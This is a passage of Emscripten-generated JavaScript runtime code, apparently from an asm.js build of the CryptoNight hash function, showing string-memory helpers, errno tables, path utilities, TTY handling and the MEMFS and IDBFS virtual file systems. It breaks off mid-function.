    var numBytesWritten = stringToUTF8Array(stringy, u8array, 0, u8array.length);
    if (dontAddNull) u8array.length = numBytesWritten;
    return u8array
}
Module["intArrayFromString"] = intArrayFromString;

function intArrayToString(array) {
    var ret = [];
    for (var i = 0; i < array.length; i++) {
        var chr = array[i];
        if (chr > 255) {
            chr &= 255
        }
        ret.push(String.fromCharCode(chr))
    }
    return ret.join("")
}
Module["intArrayToString"] = intArrayToString;

function writeStringToMemory(string, buffer, dontAddNull) {
    Runtime.warnOnce("writeStringToMemory is deprecated and should not be called! Use stringToUTF8() instead!");
    var lastChar, end;
    if (dontAddNull) {
        end = buffer + lengthBytesUTF8(string);
        lastChar = HEAP8[end]
    }
    stringToUTF8(string, buffer, Infinity);
    if (dontAddNull) HEAP8[end] = lastChar
}
Module["writeStringToMemory"] = writeStringToMemory;

function writeArrayToMemory(array, buffer) {
    HEAP8.set(array, buffer)
}
Module["writeArrayToMemory"] = writeArrayToMemory;

function writeAsciiToMemory(str, buffer, dontAddNull) {
    for (var i = 0; i < str.length; ++i) {
        HEAP8[buffer++ >> 0] = str.charCodeAt(i)
    }
    if (!dontAddNull) HEAP8[buffer >> 0] = 0
}
Module["writeAsciiToMemory"] = writeAsciiToMemory;
if (!Math["imul"] || Math["imul"](4294967295, 5) !== -5) Math["imul"] = function imul(a, b) {
    var ah = a >>> 16;
    var al = a & 65535;
    var bh = b >>> 16;
    var bl = b & 65535;
    return al * bl + (ah * bl + al * bh << 16) | 0
};
Math.imul = Math["imul"];
if (!Math["clz32"]) Math["clz32"] = (function(x) {
    x = x >>> 0;
    for (var i = 0; i < 32; i++) {
        if (x & 1 << 31 - i) return i
    }
    return 32
});
Math.clz32 = Math["clz32"];
if (!Math["trunc"]) Math["trunc"] = (function(x) {
    return x < 0 ? Math.ceil(x) : Math.floor(x)
});
Math.trunc = Math["trunc"];
var Math_abs = Math.abs;
var Math_cos = Math.cos;
var Math_sin = Math.sin;
var Math_tan = Math.tan;
var Math_acos = Math.acos;
var Math_asin = Math.asin;
var Math_atan = Math.atan;
var Math_atan2 = Math.atan2;
var Math_exp = Math.exp;
var Math_log = Math.log;
var Math_sqrt = Math.sqrt;
var Math_ceil = Math.ceil;
var Math_floor = Math.floor;
var Math_pow = Math.pow;
var Math_imul = Math.imul;
var Math_fround = Math.fround;
var Math_round = Math.round;
var Math_min = Math.min;
var Math_clz32 = Math.clz32;
var Math_trunc = Math.trunc;
var runDependencies = 0;
var runDependencyWatcher = null;
var dependenciesFulfilled = null;

function getUniqueRunDependency(id) {
    return id
}

function addRunDependency(id) {
    runDependencies++;
    if (Module["monitorRunDependencies"]) {
        Module["monitorRunDependencies"](runDependencies)
    }
}
Module["addRunDependency"] = addRunDependency;

function removeRunDependency(id) {
    runDependencies--;
    if (Module["monitorRunDependencies"]) {
        Module["monitorRunDependencies"](runDependencies)
    }
    if (runDependencies == 0) {
        if (runDependencyWatcher !== null) {
            clearInterval(runDependencyWatcher);
            runDependencyWatcher = null
        }
        if (dependenciesFulfilled) {
            var callback = dependenciesFulfilled;
            dependenciesFulfilled = null;
            callback()
        }
    }
}
Module["removeRunDependency"] = removeRunDependency;
Module["preloadedImages"] = {};
Module["preloadedAudios"] = {};
var memoryInitializer = null;
var ASM_CONSTS = [];
STATIC_BASE = Runtime.GLOBAL_BASE;
STATICTOP = STATIC_BASE + 11504;
__ATINIT__.push();
memoryInitializer = "cryptonight-asmjs.min.js.mem";
var tempDoublePtr = STATICTOP;
STATICTOP += 16;
var PROCINFO = {
    ppid: 1,
    pid: 42,
    sid: 42,
    pgid: 42
};
var ERRNO_CODES = {
    EPERM: 1,
    ENOENT: 2,
    ESRCH: 3,
    EINTR: 4,
    EIO: 5,
    ENXIO: 6,
    E2BIG: 7,
    ENOEXEC: 8,
    EBADF: 9,
    ECHILD: 10,
    EAGAIN: 11,
    EWOULDBLOCK: 11,
    ENOMEM: 12,
    EACCES: 13,
    EFAULT: 14,
    ENOTBLK: 15,
    EBUSY: 16,
    EEXIST: 17,
    EXDEV: 18,
    ENODEV: 19,
    ENOTDIR: 20,
    EISDIR: 21,
    EINVAL: 22,
    ENFILE: 23,
    EMFILE: 24,
    ENOTTY: 25,
    ETXTBSY: 26,
    EFBIG: 27,
    ENOSPC: 28,
    ESPIPE: 29,
    EROFS: 30,
    EMLINK: 31,
    EPIPE: 32,
    EDOM: 33,
    ERANGE: 34,
    ENOMSG: 42,
    EIDRM: 43,
    ECHRNG: 44,
    EL2NSYNC: 45,
    EL3HLT: 46,
    EL3RST: 47,
    ELNRNG: 48,
    EUNATCH: 49,
    ENOCSI: 50,
    EL2HLT: 51,
    EDEADLK: 35,
    ENOLCK: 37,
    EBADE: 52,
    EBADR: 53,
    EXFULL: 54,
    ENOANO: 55,
    EBADRQC: 56,
    EBADSLT: 57,
    EDEADLOCK: 35,
    EBFONT: 59,
    ENOSTR: 60,
    ENODATA: 61,
    ETIME: 62,
    ENOSR: 63,
    ENONET: 64,
    ENOPKG: 65,
    EREMOTE: 66,
    ENOLINK: 67,
    EADV: 68,
    ESRMNT: 69,
    ECOMM: 70,
    EPROTO: 71,
    EMULTIHOP: 72,
    EDOTDOT: 73,
    EBADMSG: 74,
    ENOTUNIQ: 76,
    EBADFD: 77,
    EREMCHG: 78,
    ELIBACC: 79,
    ELIBBAD: 80,
    ELIBSCN: 81,
    ELIBMAX: 82,
    ELIBEXEC: 83,
    ENOSYS: 38,
    ENOTEMPTY: 39,
    ENAMETOOLONG: 36,
    ELOOP: 40,
    EOPNOTSUPP: 95,
    EPFNOSUPPORT: 96,
    ECONNRESET: 104,
    ENOBUFS: 105,
    EAFNOSUPPORT: 97,
    EPROTOTYPE: 91,
    ENOTSOCK: 88,
    ENOPROTOOPT: 92,
    ESHUTDOWN: 108,
    ECONNREFUSED: 111,
    EADDRINUSE: 98,
    ECONNABORTED: 103,
    ENETUNREACH: 101,
    ENETDOWN: 100,
    ETIMEDOUT: 110,
    EHOSTDOWN: 112,
    EHOSTUNREACH: 113,
    EINPROGRESS: 115,
    EALREADY: 114,
    EDESTADDRREQ: 89,
    EMSGSIZE: 90,
    EPROTONOSUPPORT: 93,
    ESOCKTNOSUPPORT: 94,
    EADDRNOTAVAIL: 99,
    ENETRESET: 102,
    EISCONN: 106,
    ENOTCONN: 107,
    ETOOMANYREFS: 109,
    EUSERS: 87,
    EDQUOT: 122,
    ESTALE: 116,
    ENOTSUP: 95,
    ENOMEDIUM: 123,
    EILSEQ: 84,
    EOVERFLOW: 75,
    ECANCELED: 125,
    ENOTRECOVERABLE: 131,
    EOWNERDEAD: 130,
    ESTRPIPE: 86
};
var ERRNO_MESSAGES = {
    0: "Success",
    1: "Not super-user",
    2: "No such file or directory",
    3: "No such process",
    4: "Interrupted system call",
    5: "I/O error",
    6: "No such device or address",
    7: "Arg list too long",
    8: "Exec format error",
    9: "Bad file number",
    10: "No children",
    11: "No more processes",
    12: "Not enough core",
    13: "Permission denied",
    14: "Bad address",
    15: "Block device required",
    16: "Mount device busy",
    17: "File exists",
    18: "Cross-device link",
    19: "No such device",
    20: "Not a directory",
    21: "Is a directory",
    22: "Invalid argument",
    23: "Too many open files in system",
    24: "Too many open files",
    25: "Not a typewriter",
    26: "Text file busy",
    27: "File too large",
    28: "No space left on device",
    29: "Illegal seek",
    30: "Read only file system",
    31: "Too many links",
    32: "Broken pipe",
    33: "Math arg out of domain of func",
    34: "Math result not representable",
    35: "File locking deadlock error",
    36: "File or path name too long",
    37: "No record locks available",
    38: "Function not implemented",
    39: "Directory not empty",
    40: "Too many symbolic links",
    42: "No message of desired type",
    43: "Identifier removed",
    44: "Channel number out of range",
    45: "Level 2 not synchronized",
    46: "Level 3 halted",
    47: "Level 3 reset",
    48: "Link number out of range",
    49: "Protocol driver not attached",
    50: "No CSI structure available",
    51: "Level 2 halted",
    52: "Invalid exchange",
    53: "Invalid request descriptor",
    54: "Exchange full",
    55: "No anode",
    56: "Invalid request code",
    57: "Invalid slot",
    59: "Bad font file fmt",
    60: "Device not a stream",
    61: "No data (for no delay io)",
    62: "Timer expired",
    63: "Out of streams resources",
    64: "Machine is not on the network",
    65: "Package not installed",
    66: "The object is remote",
    67: "The link has been severed",
    68: "Advertise error",
    69: "Srmount error",
    70: "Communication error on send",
    71: "Protocol error",
    72: "Multihop attempted",
    73: "Cross mount point (not really error)",
    74: "Trying to read unreadable message",
    75: "Value too large for defined data type",
    76: "Given log. name not unique",
    77: "f.d. invalid for this operation",
    78: "Remote address changed",
    79: "Can   access a needed shared lib",
    80: "Accessing a corrupted shared lib",
    81: ".lib section in a.out corrupted",
    82: "Attempting to link in too many libs",
    83: "Attempting to exec a shared library",
    84: "Illegal byte sequence",
    86: "Streams pipe error",
    87: "Too many users",
    88: "Socket operation on non-socket",
    89: "Destination address required",
    90: "Message too long",
    91: "Protocol wrong type for socket",
    92: "Protocol not available",
    93: "Unknown protocol",
    94: "Socket type not supported",
    95: "Not supported",
    96: "Protocol family not supported",
    97: "Address family not supported by protocol family",
    98: "Address already in use",
    99: "Address not available",
    100: "Network interface is not configured",
    101: "Network is unreachable",
    102: "Connection reset by network",
    103: "Connection aborted",
    104: "Connection reset by peer",
    105: "No buffer space available",
    106: "Socket is already connected",
    107: "Socket is not connected",
    108: "Can't send after socket shutdown",
    109: "Too many references",
    110: "Connection timed out",
    111: "Connection refused",
    112: "Host is down",
    113: "Host is unreachable",
    114: "Socket already connected",
    115: "Connection already in progress",
    116: "Stale file handle",
    122: "Quota exceeded",
    123: "No medium (in tape drive)",
    125: "Operation canceled",
    130: "Previous owner died",
    131: "State not recoverable"
};

function ___setErrNo(value) {
    if (Module["___errno_location"]) HEAP32[Module["___errno_location"]() >> 2] = value;
    return value
}
var PATH = {
    splitPath: (function(filename) {
        var splitPathRe = /^(\/?|)([\s\S]*?)((?:\.{1,2}|[^\/]+?|)(\.[^.\/]*|))(?:[\/]*)$/;
        return splitPathRe.exec(filename).slice(1)
    }),
    normalizeArray: (function(parts, allowAboveRoot) {
        var up = 0;
        for (var i = parts.length - 1; i >= 0; i--) {
            var last = parts[i];
            if (last === ".") {
                parts.splice(i, 1)
            } else if (last === "..") {
                parts.splice(i, 1);
                up++
            } else if (up) {
                parts.splice(i, 1);
                up--
            }
        }
        if (allowAboveRoot) {
            for (; up; up--) {
                parts.unshift("..")
            }
        }
        return parts
    }),
    normalize: (function(path) {
        var isAbsolute = path.charAt(0) === "/",
            trailingSlash = path.substr(-1) === "/";
        path = PATH.normalizeArray(path.split("/").filter((function(p) {
            return !!p
        })), !isAbsolute).join("/");
        if (!path && !isAbsolute) {
            path = "."
        }
        if (path && trailingSlash) {
            path += "/"
        }
        return (isAbsolute ? "/" : "") + path
    }),
    dirname: (function(path) {
        var result = PATH.splitPath(path),
            root = result[0],
            dir = result[1];
        if (!root && !dir) {
            return "."
        }
        if (dir) {
            dir = dir.substr(0, dir.length - 1)
        }
        return root + dir
    }),
    basename: (function(path) {
        if (path === "/") return "/";
        var lastSlash = path.lastIndexOf("/");
        if (lastSlash === -1) return path;
        return path.substr(lastSlash + 1)
    }),
    extname: (function(path) {
        return PATH.splitPath(path)[3]
    }),
    join: (function() {
        var paths = Array.prototype.slice.call(arguments, 0);
        return PATH.normalize(paths.join("/"))
    }),
    join2: (function(l, r) {
        return PATH.normalize(l + "/" + r)
    }),
    resolve: (function() {
        var resolvedPath = "",
            resolvedAbsolute = false;
        for (var i = arguments.length - 1; i >= -1 && !resolvedAbsolute; i--) {
            var path = i >= 0 ? arguments[i] : FS.cwd();
            if (typeof path !== "string") {
                throw new TypeError("Arguments to path.resolve must be strings")
            } else if (!path) {
                return ""
            }
            resolvedPath = path + "/" + resolvedPath;
            resolvedAbsolute = path.charAt(0) === "/"
        }
        resolvedPath = PATH.normalizeArray(resolvedPath.split("/").filter((function(p) {
            return !!p
        })), !resolvedAbsolute).join("/");
        return (resolvedAbsolute ? "/" : "") + resolvedPath || "."
    }),
    relative: (function(from, to) {
        from = PATH.resolve(from).substr(1);
        to = PATH.resolve(to).substr(1);

        function trim(arr) {
            var start = 0;
            for (; start < arr.length; start++) {
                if (arr[start] !== "") break
            }
            var end = arr.length - 1;
            for (; end >= 0; end--) {
                if (arr[end] !== "") break
            }
            if (start > end) return [];
            return arr.slice(start, end - start + 1)
        }
        var fromParts = trim(from.split("/"));
        var toParts = trim(to.split("/"));
        var length = Math.min(fromParts.length, toParts.length);
        var samePartsLength = length;
        for (var i = 0; i < length; i++) {
            if (fromParts[i] !== toParts[i]) {
                samePartsLength = i;
                break
            }
        }
        var outputParts = [];
        for (var i = samePartsLength; i < fromParts.length; i++) {
            outputParts.push("..")
        }
        outputParts = outputParts.concat(toParts.slice(samePartsLength));
        return outputParts.join("/")
    })
};
var TTY = {
    ttys: [],
    init: (function() {}),
    shutdown: (function() {}),
    register: (function(dev, ops) {
        TTY.ttys[dev] = {
            input: [],
            output: [],
            ops: ops
        };
        FS.registerDevice(dev, TTY.stream_ops)
    }),
    stream_ops: {
        open: (function(stream) {
            var tty = TTY.ttys[stream.node.rdev];
            if (!tty) {
                throw new FS.ErrnoError(ERRNO_CODES.ENODEV)
            }
            stream.tty = tty;
            stream.seekable = false
        }),
        close: (function(stream) {
            stream.tty.ops.flush(stream.tty)
        }),
        flush: (function(stream) {
            stream.tty.ops.flush(stream.tty)
        }),
        read: (function(stream, buffer, offset, length, pos) {
            if (!stream.tty || !stream.tty.ops.get_char) {
                throw new FS.ErrnoError(ERRNO_CODES.ENXIO)
            }
            var bytesRead = 0;
            for (var i = 0; i < length; i++) {
                var result;
                try {
                    result = stream.tty.ops.get_char(stream.tty)
                } catch (e) {
                    throw new FS.ErrnoError(ERRNO_CODES.EIO)
                }
                if (result === undefined && bytesRead === 0) {
                    throw new FS.ErrnoError(ERRNO_CODES.EAGAIN)
                }
                if (result === null || result === undefined) break;
                bytesRead++;
                buffer[offset + i] = result
            }
            if (bytesRead) {
                stream.node.timestamp = Date.now()
            }
            return bytesRead
        }),
        write: (function(stream, buffer, offset, length, pos) {
            if (!stream.tty || !stream.tty.ops.put_char) {
                throw new FS.ErrnoError(ERRNO_CODES.ENXIO)
            }
            for (var i = 0; i < length; i++) {
                try {
                    stream.tty.ops.put_char(stream.tty, buffer[offset + i])
                } catch (e) {
                    throw new FS.ErrnoError(ERRNO_CODES.EIO)
                }
            }
            if (length) {
                stream.node.timestamp = Date.now()
            }
            return i
        })
    },
    default_tty_ops: {
        get_char: (function(tty) {
            if (!tty.input.length) {
                var result = null;
                if (ENVIRONMENT_IS_NODE) {
                    var BUFSIZE = 256;
                    var buf = new Buffer(BUFSIZE);
                    var bytesRead = 0;
                    var isPosixPlatform = process.platform != "win32";
                    var fd = process.stdin.fd;
                    if (isPosixPlatform) {
                        var usingDevice = false;
                        try {
                            fd = fs.openSync("/dev/stdin", "r");
                            usingDevice = true
                        } catch (e) {}
                    }
                    try {
                        bytesRead = fs.readSync(fd, buf, 0, BUFSIZE, null)
                    } catch (e) {
                        if (e.toString().indexOf("EOF") != -1) bytesRead = 0;
                        else throw e
                    }
                    if (usingDevice) {
                        fs.closeSync(fd)
                    }
                    if (bytesRead > 0) {
                        result = buf.slice(0, bytesRead).toString("utf-8")
                    } else {
                        result = null
                    }
                } else if (typeof window != "undefined" && typeof window.prompt == "function") {
                    result = window.prompt("Input: ");
                    if (result !== null) {
                        result += "\n"
                    }
                } else if (typeof readline == "function") {
                    result = readline();
                    if (result !== null) {
                        result += "\n"
                    }
                }
                if (!result) {
                    return null
                }
                tty.input = intArrayFromString(result, true)
            }
            return tty.input.shift()
        }),
        put_char: (function(tty, val) {
            if (val === null || val === 10) {
                Module["print"](UTF8ArrayToString(tty.output, 0));
                tty.output = []
            } else {
                if (val != 0) tty.output.push(val)
            }
        }),
        flush: (function(tty) {
            if (tty.output && tty.output.length > 0) {
                Module["print"](UTF8ArrayToString(tty.output, 0));
                tty.output = []
            }
        })
    },
    default_tty1_ops: {
        put_char: (function(tty, val) {
            if (val === null || val === 10) {
                Module["printErr"](UTF8ArrayToString(tty.output, 0));
                tty.output = []
            } else {
                if (val != 0) tty.output.push(val)
            }
        }),
        flush: (function(tty) {
            if (tty.output && tty.output.length > 0) {
                Module["printErr"](UTF8ArrayToString(tty.output, 0));
                tty.output = []
            }
        })
    }
};
var MEMFS = {
    ops_table: null,
    mount: (function(mount) {
        return MEMFS.createNode(null, "/", 16384 | 511, 0)
    }),
    createNode: (function(parent, name, mode, dev) {
        if (FS.isBlkdev(mode) || FS.isFIFO(mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        if (!MEMFS.ops_table) {
            MEMFS.ops_table = {
                dir: {
                    node: {
                        getattr: MEMFS.node_ops.getattr,
                        setattr: MEMFS.node_ops.setattr,
                        lookup: MEMFS.node_ops.lookup,
                        mknod: MEMFS.node_ops.mknod,
                        rename: MEMFS.node_ops.rename,
                        unlink: MEMFS.node_ops.unlink,
                        rmdir: MEMFS.node_ops.rmdir,
                        readdir: MEMFS.node_ops.readdir,
                        symlink: MEMFS.node_ops.symlink
                    },
                    stream: {
                        llseek: MEMFS.stream_ops.llseek
                    }
                },
                file: {
                    node: {
                        getattr: MEMFS.node_ops.getattr,
                        setattr: MEMFS.node_ops.setattr
                    },
                    stream: {
                        llseek: MEMFS.stream_ops.llseek,
                        read: MEMFS.stream_ops.read,
                        write: MEMFS.stream_ops.write,
                        allocate: MEMFS.stream_ops.allocate,
                        mmap: MEMFS.stream_ops.mmap,
                        msync: MEMFS.stream_ops.msync
                    }
                },
                link: {
                    node: {
                        getattr: MEMFS.node_ops.getattr,
                        setattr: MEMFS.node_ops.setattr,
                        readlink: MEMFS.node_ops.readlink
                    },
                    stream: {}
                },
                chrdev: {
                    node: {
                        getattr: MEMFS.node_ops.getattr,
                        setattr: MEMFS.node_ops.setattr
                    },
                    stream: FS.chrdev_stream_ops
                }
            }
        }
        var node = FS.createNode(parent, name, mode, dev);
        if (FS.isDir(node.mode)) {
            node.node_ops = MEMFS.ops_table.dir.node;
            node.stream_ops = MEMFS.ops_table.dir.stream;
            node.contents = {}
        } else if (FS.isFile(node.mode)) {
            node.node_ops = MEMFS.ops_table.file.node;
            node.stream_ops = MEMFS.ops_table.file.stream;
            node.usedBytes = 0;
            node.contents = null
        } else if (FS.isLink(node.mode)) {
            node.node_ops = MEMFS.ops_table.link.node;
            node.stream_ops = MEMFS.ops_table.link.stream
        } else if (FS.isChrdev(node.mode)) {
            node.node_ops = MEMFS.ops_table.chrdev.node;
            node.stream_ops = MEMFS.ops_table.chrdev.stream
        }
        node.timestamp = Date.now();
        if (parent) {
            parent.contents[name] = node
        }
        return node
    }),
    getFileDataAsRegularArray: (function(node) {
        if (node.contents && node.contents.subarray) {
            var arr = [];
            for (var i = 0; i < node.usedBytes; ++i) arr.push(node.contents[i]);
            return arr
        }
        return node.contents
    }),
    getFileDataAsTypedArray: (function(node) {
        if (!node.contents) return new Uint8Array;
        if (node.contents.subarray) return node.contents.subarray(0, node.usedBytes);
        return new Uint8Array(node.contents)
    }),
    expandFileStorage: (function(node, newCapacity) {
        if (node.contents && node.contents.subarray && newCapacity > node.contents.length) {
            node.contents = MEMFS.getFileDataAsRegularArray(node);
            node.usedBytes = node.contents.length
        }
        if (!node.contents || node.contents.subarray) {
            var prevCapacity = node.contents ? node.contents.length : 0;
            if (prevCapacity >= newCapacity) return;
            var CAPACITY_DOUBLING_MAX = 1024 * 1024;
            newCapacity = Math.max(newCapacity, prevCapacity * (prevCapacity < CAPACITY_DOUBLING_MAX ? 2 : 1.125) | 0);
            if (prevCapacity != 0) newCapacity = Math.max(newCapacity, 256);
            var oldContents = node.contents;
            node.contents = new Uint8Array(newCapacity);
            if (node.usedBytes > 0) node.contents.set(oldContents.subarray(0, node.usedBytes), 0);
            return
        }
        if (!node.contents && newCapacity > 0) node.contents = [];
        while (node.contents.length < newCapacity) node.contents.push(0)
    }),
    resizeFileStorage: (function(node, newSize) {
        if (node.usedBytes == newSize) return;
        if (newSize == 0) {
            node.contents = null;
            node.usedBytes = 0;
            return
        }
        if (!node.contents || node.contents.subarray) {
            var oldContents = node.contents;
            node.contents = new Uint8Array(new ArrayBuffer(newSize));
            if (oldContents) {
                node.contents.set(oldContents.subarray(0, Math.min(newSize, node.usedBytes)))
            }
            node.usedBytes = newSize;
            return
        }
        if (!node.contents) node.contents = [];
        if (node.contents.length > newSize) node.contents.length = newSize;
        else
            while (node.contents.length < newSize) node.contents.push(0);
        node.usedBytes = newSize
    }),
    node_ops: {
        getattr: (function(node) {
            var attr = {};
            attr.dev = FS.isChrdev(node.mode) ? node.id : 1;
            attr.ino = node.id;
            attr.mode = node.mode;
            attr.nlink = 1;
            attr.uid = 0;
            attr.gid = 0;
            attr.rdev = node.rdev;
            if (FS.isDir(node.mode)) {
                attr.size = 4096
            } else if (FS.isFile(node.mode)) {
                attr.size = node.usedBytes
            } else if (FS.isLink(node.mode)) {
                attr.size = node.link.length
            } else {
                attr.size = 0
            }
            attr.atime = new Date(node.timestamp);
            attr.mtime = new Date(node.timestamp);
            attr.ctime = new Date(node.timestamp);
            attr.blksize = 4096;
            attr.blocks = Math.ceil(attr.size / attr.blksize);
            return attr
        }),
        setattr: (function(node, attr) {
            if (attr.mode !== undefined) {
                node.mode = attr.mode
            }
            if (attr.timestamp !== undefined) {
                node.timestamp = attr.timestamp
            }
            if (attr.size !== undefined) {
                MEMFS.resizeFileStorage(node, attr.size)
            }
        }),
        lookup: (function(parent, name) {
            throw FS.genericErrors[ERRNO_CODES.ENOENT]
        }),
        mknod: (function(parent, name, mode, dev) {
            return MEMFS.createNode(parent, name, mode, dev)
        }),
        rename: (function(old_node, new_dir, new_name) {
            if (FS.isDir(old_node.mode)) {
                var new_node;
                try {
                    new_node = FS.lookupNode(new_dir, new_name)
                } catch (e) {}
                if (new_node) {
                    for (var i in new_node.contents) {
                        throw new FS.ErrnoError(ERRNO_CODES.ENOTEMPTY)
                    }
                }
            }
            delete old_node.parent.contents[old_node.name];
            old_node.name = new_name;
            new_dir.contents[new_name] = old_node;
            old_node.parent = new_dir
        }),
        unlink: (function(parent, name) {
            delete parent.contents[name]
        }),
        rmdir: (function(parent, name) {
            var node = FS.lookupNode(parent, name);
            for (var i in node.contents) {
                throw new FS.ErrnoError(ERRNO_CODES.ENOTEMPTY)
            }
            delete parent.contents[name]
        }),
        readdir: (function(node) {
            var entries = [".", ".."];
            for (var key in node.contents) {
                if (!node.contents.hasOwnProperty(key)) {
                    continue
                }
                entries.push(key)
            }
            return entries
        }),
        symlink: (function(parent, newname, oldpath) {
            var node = MEMFS.createNode(parent, newname, 511 | 40960, 0);
            node.link = oldpath;
            return node
        }),
        readlink: (function(node) {
            if (!FS.isLink(node.mode)) {
                throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
            }
            return node.link
        })
    },
    stream_ops: {
        read: (function(stream, buffer, offset, length, position) {
            var contents = stream.node.contents;
            if (position >= stream.node.usedBytes) return 0;
            var size = Math.min(stream.node.usedBytes - position, length);
            assert(size >= 0);
            if (size > 8 && contents.subarray) {
                buffer.set(contents.subarray(position, position + size), offset)
            } else {
                for (var i = 0; i < size; i++) buffer[offset + i] = contents[position + i]
            }
            return size
        }),
        write: (function(stream, buffer, offset, length, position, canOwn) {
            if (!length) return 0;
            var node = stream.node;
            node.timestamp = Date.now();
            if (buffer.subarray && (!node.contents || node.contents.subarray)) {
                if (canOwn) {
                    node.contents = buffer.subarray(offset, offset + length);
                    node.usedBytes = length;
                    return length
                } else if (node.usedBytes === 0 && position === 0) {
                    node.contents = new Uint8Array(buffer.subarray(offset, offset + length));
                    node.usedBytes = length;
                    return length
                } else if (position + length <= node.usedBytes) {
                    node.contents.set(buffer.subarray(offset, offset + length), position);
                    return length
                }
            }
            MEMFS.expandFileStorage(node, position + length);
            if (node.contents.subarray && buffer.subarray) node.contents.set(buffer.subarray(offset, offset + length), position);
            else {
                for (var i = 0; i < length; i++) {
                    node.contents[position + i] = buffer[offset + i]
                }
            }
            node.usedBytes = Math.max(node.usedBytes, position + length);
            return length
        }),
        llseek: (function(stream, offset, whence) {
            var position = offset;
            if (whence === 1) {
                position += stream.position
            } else if (whence === 2) {
                if (FS.isFile(stream.node.mode)) {
                    position += stream.node.usedBytes
                }
            }
            if (position < 0) {
                throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
            }
            return position
        }),
        allocate: (function(stream, offset, length) {
            MEMFS.expandFileStorage(stream.node, offset + length);
            stream.node.usedBytes = Math.max(stream.node.usedBytes, offset + length)
        }),
        mmap: (function(stream, buffer, offset, length, position, prot, flags) {
            if (!FS.isFile(stream.node.mode)) {
                throw new FS.ErrnoError(ERRNO_CODES.ENODEV)
            }
            var ptr;
            var allocated;
            var contents = stream.node.contents;
            if (!(flags & 2) && (contents.buffer === buffer || contents.buffer === buffer.buffer)) {
                allocated = false;
                ptr = contents.byteOffset
            } else {
                if (position > 0 || position + length < stream.node.usedBytes) {
                    if (contents.subarray) {
                        contents = contents.subarray(position, position + length)
                    } else {
                        contents = Array.prototype.slice.call(contents, position, position + length)
                    }
                }
                allocated = true;
                ptr = _malloc(length);
                if (!ptr) {
                    throw new FS.ErrnoError(ERRNO_CODES.ENOMEM)
                }
                buffer.set(contents, ptr)
            }
            return {
                ptr: ptr,
                allocated: allocated
            }
        }),
        msync: (function(stream, buffer, offset, length, mmapFlags) {
            if (!FS.isFile(stream.node.mode)) {
                throw new FS.ErrnoError(ERRNO_CODES.ENODEV)
            }
            if (mmapFlags & 2) {
                return 0
            }
            var bytesWritten = MEMFS.stream_ops.write(stream, buffer, 0, length, offset, false);
            return 0
        })
    }
};
var IDBFS = {
    dbs: {},
    indexedDB: (function() {
        if (typeof indexedDB !== "undefined") return indexedDB;
        var ret = null;
        if (typeof window === "object") ret = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB;
        assert(ret, "IDBFS used, but indexedDB not supported");
        return ret
    }),
    DB_VERSION: 21,
    DB_STORE_NAME: "FILE_DATA",
    mount: (function(mount) {
        return MEMFS.mount.apply(null, arguments)
    }),
    syncfs: (function(mount, populate, callback) {
        IDBFS.getLocalSet(mount, (function(err, local) {
            if (err) return callback(err);
            IDBFS.getRemoteSet(mount, (function(err, remote) {
                if (err) return callback(err);
                var src = populate ? remote : local;
                var dst = populate ? local : remote;
                IDBFS.reconcile(src, dst, callback)
            }))
        }))
    }),
    getDB: (function(name, callback) {
        var db = IDBFS.dbs[name];
        if (db) {
            return callback(null, db)
        }
        var req;
        try {
            req = IDBFS.indexedDB().open(name, IDBFS.DB_VERSION)
        } catch (e) {
            return callback(e)
        }
        if (!req) {
            return callback("Unable to connect to IndexedDB")
        }
        req.onupgradeneeded = (function(e) {
            var db = e.target.result;
            var transaction = e.target.transaction;
            var fileStore;
            if (db.objectStoreNames.contains(IDBFS.DB_STORE_NAME)) {
                fileStore = transaction.objectStore(IDBFS.DB_STORE_NAME)
            } else {
                fileStore = db.createObjectStore(IDBFS.DB_STORE_NAME)
            }
            if (!fileStore.indexNames.contains("timestamp")) {
                fileStore.createIndex("timestamp", "timestamp", {
                    unique: false
                })
            }
        });
        req.onsuccess = (function() {
            db = req.result;
            IDBFS.dbs[name] = db;
            callback(null, db)
        });
        req.onerror = (function(e) {
            callback(this.error);
            e.preventDefault()
        })
    }),
    getLocalSet: (function(mount, callback) {
        var entries = {};

        function isRealDir(p) {
            return p !== "." && p !== ".."
        }

        function toAbsolute(root) {
            return (function(p) {
                return PATH.join2(root, p)
            })
        }
        var check = FS.readdir(mount.mountpoint).filter(isRealDir).map(toAbsolute(mount.mountpoint));
        while (check.length) {
            var path = check.pop();
            var stat;
            try {
                stat = FS.stat(path)
            } catch (e) {
                return callback(e)
            }
            if (FS.isDir(stat.mode)) {
                check.push.apply(check, FS.readdir(path).filter(isRealDir).map(toAbsolute(path)))
            }
            entries[path] = {
                timestamp: stat.mtime
            }
        }
        return callback(null, {
            type: "local",
            entries: entries
        })
    }),
    getRemoteSet: (function(mount, callback) {
        var entries = {};
        IDBFS.getDB(mount.mountpoint, (function(err, db) {
            if (err) return callback(err);
            var transaction = db.transaction([IDBFS.DB_STORE_NAME], "readonly");
            transaction.onerror = (function(e) {
                callback(this.error);
                e.preventDefault()
            });
            var store = transaction.objectStore(IDBFS.DB_STORE_NAME);
            var index = store.index("timestamp");
            index.openKeyCursor().onsuccess = (function(event) {
                var cursor = event.target.result;
                if (!cursor) {
                    return callback(null, {
                        type: "remote",
                        db: db,
                        entries: entries
                    })
                }
                entries[cursor.primaryKey] = {
                    timestamp: cursor.key
                };
                cursor.continue()
            })
        }))
    }),
    loadLocalEntry: (function(path, callback) {
        var stat, node;
        try {
            var lookup = FS.lookupPath(path);
            node = lookup.node;
            stat = FS.stat(path)
        } catch (e) {
            return callback(e)
        }
        if (FS.isDir(stat.mode)) {
            return callback(null, {
                timestamp: stat.mtime,
                mode: stat.mode
            })
        } else if (FS.isFile(stat.mode)) {
            node.contents = MEMFS.getFileDataAsTypedArray(node);
            return callback(null, {
                timestamp: stat.mtime,
                mode: stat.mode,
                contents: node.contents
            })
        } else {
            return callback(new Error("node type not supported"))
        }
    }),
    storeLocalEntry: (function(path, entry, callback) {
        try {
            if (FS.isDir(entry.mode)) {
                FS.mkdir(path, entry.mode)
            } else if (FS.isFile(entry.mode)) {
                FS.writeFile(path, entry.contents, {
                    encoding: "binary",
                    canOwn: true
                })
            } else {
                return callback(new Error("node type not supported"))
            }
            FS.chmod(path, entry.mode);
            FS.utime(path, entry.timestamp, entry.timestamp)
        } catch (e) {
            return callback(e)
        }
        callback(null)
    }),
    removeLocalEntry: (function(path, callback) {
        try {
            var lookup = FS.lookupPath(path);
